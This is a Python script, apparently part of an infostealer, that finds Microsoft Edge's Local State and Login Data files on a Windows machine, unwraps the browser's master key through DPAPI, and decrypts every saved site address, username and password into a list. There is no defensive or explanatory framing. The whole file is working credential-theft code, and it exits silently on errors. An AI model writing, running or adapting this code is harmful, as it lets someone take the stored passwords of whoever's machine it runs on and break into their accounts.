import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

FileName = 116444736000000000
NanoSeconds = 10000000

def get_master_key():
    try:
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State',
              "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    except:
        exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"


def get_password(set):
    master_key = get_master_key()
    login_db = os.environ[
                   'USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try:
        shutil.copy2(login_db,
                     "Loginvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
    except:
        print("")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
               library = dict(type = "browser",url = url,user = username, password = decrypted_password)
               set.append(library)
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass